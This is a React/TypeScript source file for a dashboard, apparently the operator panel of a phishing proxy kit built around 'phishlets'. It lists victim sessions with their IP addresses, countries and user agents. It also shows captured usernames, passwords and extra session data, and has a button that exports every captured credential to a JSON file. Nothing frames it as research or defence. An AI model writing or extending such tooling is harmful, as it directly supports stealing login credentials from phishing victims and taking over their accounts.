import React, { useState, useEffect } from 'react';

interface Session {
  id: string;
  phishlet: string;
  ip: string;
  userAgent: string;
  country: string;
  startTime: string;
  lastActivity: string;
  status: 'active' | 'completed' | 'blocked' | 'expired';
  credentials: Credential[];
  requestCount: number;
  threatLevel: number;
}

interface Credential {
  id: string;
  sessionId: string;
  type: string;
  username: string;
  password: string;
  capturedAt: string;
  additionalData: Record<string, any>;
}

const SessionMonitor: React.FC = () => {
  const [sessions, setSessions] = useState<Session[]>([]);
  const [credentials, setCredentials] = useState<Credential[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [selectedSession, setSelectedSession] = useState<Session | null>(null);
  const [activeTab, setActiveTab] = useState<'sessions' | 'credentials'>('sessions');
  const [autoRefresh, setAutoRefresh] = useState(true);

  useEffect(() => {
    const fetchData = async () => {
      try {
        setLoading(true);
        const apiUrl = import.meta.env.VITE_API_URL || 'http://localhost:8080';
        
        const [sessionsResponse, credentialsResponse] = await Promise.all([
          fetch(`${apiUrl}/api/sessions`),
          fetch(`${apiUrl}/api/credentials`)
        ]);

        if (sessionsResponse.ok) {
          const sessionsData = await sessionsResponse.json();
          setSessions(sessionsData);
        }

        if (credentialsResponse.ok) {
          const credentialsData = await credentialsResponse.json();
          setCredentials(credentialsData);
        }

        setError(null);
      } catch (err) {
        setError('Failed to fetch session data');
        console.error('Session fetch error:', err);
      } finally {
        setLoading(false);
      }
    };

    fetchData();
    
    let interval: ReturnType<typeof setInterval> | undefined;
    if (autoRefresh) {
      interval = setInterval(fetchData, 5000);
    }
    
    return () => {
      if (interval) clearInterval(interval);
    };
  }, [autoRefresh]);

  const terminateSession = async (sessionId: string) => {
    try {
      const apiUrl = import.meta.env.VITE_API_URL || 'http://localhost:8080';
      const response = await fetch(`${apiUrl}/api/sessions/${sessionId}/terminate`, {
        method: 'POST'
      });

      if (response.ok) {
        setSessions(prev => prev.map(s => 
          s.id === sessionId ? { ...s, status: 'expired' as const } : s
        ));
      }
    } catch (err) {
      console.error('Terminate session error:', err);
    }
  };

  const exportCredentials = () => {
    const dataStr = JSON.stringify(credentials, null, 2);
    const dataBlob = new Blob([dataStr], { type: 'application/json' });
    const url = URL.createObjectURL(dataBlob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `credentials-${new Date().toISOString().split('T')[0]}.json`;
    link.click();
    URL.revokeObjectURL(url);
  };

  const getThreatLevelColor = (level: number) => {
    if (level >= 70) return 'threat-high';
    if (level >= 40) return 'threat-medium';
    return 'threat-low';
  };

  if (loading) {
    return <div className="loading">Loading session data...</div>;
  }

  if (error) {
    return <div className="error">{error}</div>;
  }

  return (
    <div className="session-monitor">
      <div className="card">
        <div className="card-header">
          <h2 className="card-title">Session Monitor</h2>
          <div className="header-controls">
            <label className="auto-refresh-toggle">
              <input
                type="checkbox"
                checked={autoRefresh}
                onChange={(e) => setAutoRefresh(e.target.checked)}
              />
              Auto-refresh
            </label>
            {activeTab === 'credentials' && (
              <button className="btn btn-primary" onClick={exportCredentials}>
                Export Credentials
              </button>
            )}
          </div>
        </div>

        <div className="tab-navigation">
          <button
            className={`tab-button ${activeTab === 'sessions' ? 'active' : ''}`}
            onClick={() => setActiveTab('sessions')}
          >
            Active Sessions ({sessions.filter(s => s.status === 'active').length})
          </button>
          <button
            className={`tab-button ${activeTab === 'credentials' ? 'active' : ''}`}
            onClick={() => setActiveTab('credentials')}
          >
            Captured Credentials ({credentials.length})
          </button>
        </div>

        {activeTab === 'sessions' && (
          <div className="sessions-tab">
            {sessions.length === 0 ? (
              <p>No sessions found.</p>
            ) : (
              <table className="table">
                <thead>
                  <tr>
                    <th>Session ID</th>
                    <th>Phishlet</th>
                    <th>IP Address</th>
                    <th>Country</th>
                    <th>Start Time</th>
                    <th>Last Activity</th>
                    <th>Requests</th>
                    <th>Threat Level</th>
                    <th>Status</th>
                    <th>Actions</th>
                  </tr>
                </thead>
                <tbody>
                  {sessions.map(session => (
                    <tr key={session.id}>
                      <td>{session.id.substring(0, 8)}...</td>
                      <td>{session.phishlet}</td>
                      <td>{session.ip}</td>
                      <td>{session.country}</td>
                      <td>{new Date(session.startTime).toLocaleString()}</td>
                      <td>{new Date(session.lastActivity).toLocaleString()}</td>
                      <td>{session.requestCount}</td>
                      <td>
                        <span className={`threat-level ${getThreatLevelColor(session.threatLevel)}`}>
                          {session.threatLevel}%
                        </span>
                      </td>
                      <td>
                        <span className={`status-badge status-${session.status}`}>
                          {session.status}
                        </span>
                      </td>
                      <td>
                        <button
                          className="btn btn-secondary btn-sm"
                          onClick={() => setSelectedSession(session)}
                        >
                          Details
                        </button>
                        {session.status === 'active' && (
                          <button
                            className="btn btn-danger btn-sm"
                            onClick={() => terminateSession(session.id)}
                            style={{ marginLeft: '0.5rem' }}
                          >
                            Terminate
                          </button>
                        )}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            )}
          </div>
        )}

        {activeTab === 'credentials' && (
          <div className="credentials-tab">
            {credentials.length === 0 ? (
              <p>No credentials captured yet.</p>
            ) : (
              <table className="table">
                <thead>
                  <tr>
                    <th>Session ID</th>
                    <th>Type</th>
                    <th>Username</th>
                    <th>Password</th>
                    <th>Captured At</th>
                    <th>Additional Data</th>
                  </tr>
                </thead>
                <tbody>
                  {credentials.map(credential => (
                    <tr key={credential.id}>
                      <td>{credential.sessionId.substring(0, 8)}...</td>
                      <td>{credential.type}</td>
                      <td>{credential.username}</td>
                      <td>
                        <span className="password-field">
                          {'*'.repeat(credential.password.length)}
                        </span>
                      </td>
                      <td>{new Date(credential.capturedAt).toLocaleString()}</td>
                      <td>
                        {Object.keys(credential.additionalData).length > 0 ? (
                          <details>
                            <summary>View Data</summary>
                            <pre>{JSON.stringify(credential.additionalData, null, 2)}</pre>
                          </details>
                        ) : (
                          'None'
                        )}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            )}
          </div>
        )}
      </div>

      {selectedSession && (
        <div className="modal-overlay">
          <div className="modal modal-large">
            <div className="modal-header">
              <h3>Session Details - {selectedSession.id}</h3>
              <button 
                className="modal-close"
                onClick={() => setSelectedSession(null)}
              >
                ×
              </button>
            </div>
            
            <div className="modal-body">
              <div className="session-details">
                <div className="detail-group">
                  <h4>Basic Information</h4>
                  <p><strong>Session ID:</strong> {selectedSession.id}</p>
                  <p><strong>Phishlet:</strong> {selectedSession.phishlet}</p>
                  <p><strong>IP Address:</strong> {selectedSession.ip}</p>
                  <p><strong>Country:</strong> {selectedSession.country}</p>
                  <p><strong>User Agent:</strong> {selectedSession.userAgent}</p>
                </div>

                <div className="detail-group">
                  <h4>Activity</h4>
                  <p><strong>Start Time:</strong> {new Date(selectedSession.startTime).toLocaleString()}</p>
                  <p><strong>Last Activity:</strong> {new Date(selectedSession.lastActivity).toLocaleString()}</p>
                  <p><strong>Request Count:</strong> {selectedSession.requestCount}</p>
                  <p><strong>Status:</strong> {selectedSession.status}</p>
                  <p><strong>Threat Level:</strong> 
                    <span className={`threat-level ${getThreatLevelColor(selectedSession.threatLevel)}`}>
                      {selectedSession.threatLevel}%
                    </span>
                  </p>
                </div>

                <div className="detail-group">
                  <h4>Captured Credentials ({selectedSession.credentials.length})</h4>
                  {selectedSession.credentials.length === 0 ? (
                    <p>No credentials captured for this session.</p>
                  ) : (
                    <table className="table">
                      <thead>
                        <tr>
                          <th>Type</th>
                          <th>Username</th>
                          <th>Captured At</th>
                        </tr>
                      </thead>
                      <tbody>
                        {selectedSession.credentials.map(cred => (
                          <tr key={cred.id}>
                            <td>{cred.type}</td>
                            <td>{cred.username}</td>
                            <td>{new Date(cred.capturedAt).toLocaleString()}</td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  )}
                </div>
              </div>
            </div>

            <div className="modal-footer">
              <button
                className="btn btn-secondary"
                onClick={() => setSelectedSession(null)}
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default SessionMonitor;
